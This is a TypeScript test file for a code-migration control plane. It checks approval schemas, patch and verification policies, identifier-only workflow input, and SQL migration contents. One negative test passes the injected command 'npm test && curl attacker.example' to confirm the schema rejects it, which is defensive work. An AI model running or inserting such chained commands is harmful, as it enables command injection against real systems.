import { readFileSync } from 'node:fs';

import { describe, expect, it } from 'vitest';

import {
  migrationApprovalAuthoritySchema,
  migrationApprovalPatchPolicySchema,
  migrationApprovalVerificationProfileSchema,
  migrationWorkflowInputSchema,
} from '@migration/contracts';

const migration = readFileSync(
  new URL('../supabase/migrations/0010_stage_4a_control_plane.sql', import.meta.url),
  'utf8',
);
const rollback = readFileSync(
  new URL(
    '../supabase/migrations/0010_stage_4a_control_plane.down.sql',
    import.meta.url,
  ),
  'utf8',
);

const patchPolicy = {
  schemaVersion: '1.0',
  allowedPaths: ['package.json', 'src/orbitchat-client.ts'],
  allowedChangeCategories: ['dependency_manifest', 'direct_usage'],
  maxChangedFiles: 10,
  maxPatchBytes: 262_144,
  maxAddedLines: 1_000,
  maxDeletedLines: 500,
} as const;

const verificationProfile = {
  schemaVersion: '1.0',
  profiles: [
    {
      profile: 'typescript_static',
      availability: 'available',
      commandIds: ['npm.typecheck'],
    },
    {
      profile: 'typescript_unit',
      availability: 'unavailable',
      commandIds: [],
    },
  ],
} as const;

describe('Stage 4A durable control plane', () => {
  it('accepts bounded, versioned approval authority', () => {
    expect(
      migrationApprovalAuthoritySchema.parse({
        schemaVersion: '1.0',
        approvalContractVersion: '1.0',
        agentPolicyVersion: 'migration-agent-1.0',
        toolRegistryVersion: 'migration-tools-1.0',
        patchPolicyVersion: 'typescript-bounded-1.0',
        patchPolicy,
        verificationPolicyVersion: 'typescript-default-1.0',
        verificationProfile,
        publicationPolicyVersion: 'draft-pr-1.0',
        openaiProcessingPolicyVersion: 'default-controls-1.0',
        openaiProcessingMode: 'default_controls',
      }),
    ).toBeDefined();
  });

  it('rejects duplicate paths and shell-shaped verification commands', () => {
    expect(() =>
      migrationApprovalPatchPolicySchema.parse({
        ...patchPolicy,
        allowedPaths: ['package.json', 'package.json'],
      }),
    ).toThrow();
    expect(() =>
      migrationApprovalVerificationProfileSchema.parse({
        ...verificationProfile,
        profiles: [
          {
            profile: 'typescript_static',
            availability: 'available',
            commandIds: ['npm test && curl attacker.example'],
          },
        ],
      }),
    ).toThrow();
  });

  it('does not authorize commands for unavailable verification profiles', () => {
    expect(() =>
      migrationApprovalVerificationProfileSchema.parse({
        ...verificationProfile,
        profiles: [
          {
            profile: 'typescript_unit',
            availability: 'unavailable',
            commandIds: ['npm.test'],
          },
        ],
      }),
    ).toThrow();
  });

  it('allows only identifiers and expected versions in workflow history', () => {
    const input = {
      schemaVersion: '1.0',
      organisationId: '6b768f2a-7bd0-47b7-8acb-f8c7ebfd8624',
      migrationRunId: 'e4e2d9db-bd1c-4eef-b685-231128724583',
      candidateId: '12a906c7-f7df-4c65-9137-70bcf17eec86',
      approvalId: '30a75bfd-6a69-4368-a341-10362df73007',
      repositoryId: '07a17d5a-820d-4199-93d9-4e71b1c2d4f5',
      correlationId: '914e7575-7dc8-40e4-9445-aa61bfdb4ade',
      expectedAttempt: 1,
      expectedVersion: 1,
    } as const;
    expect(migrationWorkflowInputSchema.parse(input)).toEqual(input);
    expect(() =>
      migrationWorkflowInputSchema.parse({
        ...input,
        source: 'source must never enter Step Functions input',
      }),
    ).toThrow();
  });

  it('binds approval authority to exact tenant and evidence identities', () => {
    expect(migration).toContain('create table migration_approvals');
    expect(migration).toContain('migration_candidates_stage4_approval_identity_unique');
    expect(migration).toContain('repository_snapshots_stage4_approval_identity_unique');
    expect(migration).toContain('impact_reports_stage4_approval_identity_unique');
    expect(migration).toContain('acknowledgement_source_processing');
    expect(migration).toContain('and acknowledgement_human_review_required');
    expect(migration).toContain('unique (approved_by_user_id, idempotency_key)');
  });

  it('keeps approval and revocation records append-only', () => {
    expect(migration).toContain('migration_approvals_immutable');
    expect(migration).toContain('migration_approval_revocations_immutable');
    expect(migration).toContain('reject_immutable_stage4_record_change');
    expect(migration).toMatch(
      /grant select, insert on\s+ migration_approvals,\s+ migration_approval_revocations\s+to app_runtime;/u,
    );
    expect(migration).not.toMatch(
      /grant select, insert, update on\s+ migration_approvals/u,
    );
  });

  it('creates one run per approval and a bounded identifier-only outbox', () => {
    expect(migration).toContain('approval_id uuid not null unique');
    expect(migration).toContain("event_type = 'migration_run.requested'");
    expect(migration).toContain('payload ?& array[');
    expect(migration).toContain('and payload - array[');
    expect(migration).toContain('migration_run_outbox_pending_idx');
  });

  it('provides a reversible schema migration', () => {
    expect(rollback).toContain('drop table if exists migration_run_outbox');
    expect(rollback).toContain('drop table if exists migration_approvals');
    expect(rollback).toContain(
      'drop constraint if exists repositories_stage4_approval_identity_unique',
    );
  });
});
